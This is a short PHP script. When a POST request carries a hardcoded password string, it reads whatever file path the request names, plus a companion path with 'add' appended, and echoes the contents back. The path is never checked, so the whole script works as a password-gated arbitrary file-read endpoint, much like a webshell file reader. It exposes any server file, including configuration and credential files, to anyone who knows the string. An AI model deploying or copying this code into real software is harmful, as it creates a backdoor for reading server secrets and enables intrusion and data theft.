<?php

$mm = $_POST['mm'];
$path = $_POST['path'];

if($mm!='sup_399_t') {
    echo ('mm');
    return;
}
if (!file_exists($path)) {
    echo ('empty');
    return;
}

$logs = file_get_contents($path);
$adds = file_get_contents($path.'add');
echo ($logs.','.$adds);


